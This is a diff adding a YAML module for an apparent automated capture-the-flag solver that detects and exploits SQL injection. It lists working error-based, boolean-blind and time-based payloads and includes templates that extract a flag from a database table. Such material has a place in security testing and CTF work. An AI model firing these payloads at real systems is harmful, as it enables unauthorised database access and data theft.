@@ -1,0 +1,95 @@
+id: web_sqli
+name: SQL Injection
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits SQL injection via error-based, boolean-blind,
+  time-based, and union-based techniques.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+confidence_seeds:
+  - if: "'/login' in context.found_paths or '/admin' in context.found_paths"
+    boost: 0.25
+    label: "Sensitive path found"
+  - if: "'php' in context.tech_stack or 'asp' in context.tech_stack"
+    boost: 0.15
+    label: "Server-side language detected"
+  - if: "any(p in context.params for p in ['id','user','item','cat','page'])"
+    boost: 0.20
+    label: "Numeric/ID-style parameter found"
+
+detection:
+  min_confidence: 0.10
+  paths:
+    - id: error_based
+      name: "Error-Based Detection"
+      steps:
+        - id: single_quote_probe
+          action: http_probe
+          with:
+            payloads: ["'", "''", '"', '`']
+            inject_into: all_params
+          signals:
+            - match: "SQL syntax|mysql_fetch_array|ORA-[0-9]+|sqlite.*error|pg_query"
+              on_match:
+                confidence_boost: 0.85
+                emit: error_based_confirmed
+
+    - id: boolean_based
+      name: "Boolean-Based Blind Detection"
+      steps:
+        - id: true_false_probe
+          action: http_probe
+          with:
+            true_payload: "' AND 1=1--"
+            false_payload: "' AND 1=2--"
+            inject_into: all_params
+          signals:
+            - match:
+                condition: "true_response.body != false_response.body"
+              on_match:
+                confidence_boost: 0.70
+                emit: boolean_based_confirmed
+
+    - id: time_based
+      name: "Time-Based Blind Detection"
+      steps:
+        - id: sleep_probe
+          action: http_probe
+          with:
+            payloads: ["' AND SLEEP(3)--", "'; SELECT pg_sleep(3)--"]
+            inject_into: all_params
+          signals:
+            - match:
+                condition: "response_time >= 3000"
+              on_match:
+                confidence_boost: 0.65
+                emit: time_based_confirmed
+
+exploitation:
+  stop_on_flag: true
+  paths:
+    - id: error_extract
+      name: "Error-Based Data Extraction"
+      requires_signal: error_based_confirmed
+      technique: error_based
+      steps:
+        - id: extract_flag
+          action: http_probe
+          with:
+            payload: "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)))--"
+            inject_into: vulnerable_param
+
+    - id: boolean_extract
+      name: "Boolean Blind Extraction"
+      requires_signal: boolean_based_confirmed
+      technique: boolean_blind
+      steps:
+        - id: blind_extract
+          action: blind_extract
+          with:
+            true_template: "' AND SUBSTRING((SELECT flag FROM flags),{pos},1)='{char}'--"
+            inject_into: vulnerable_param
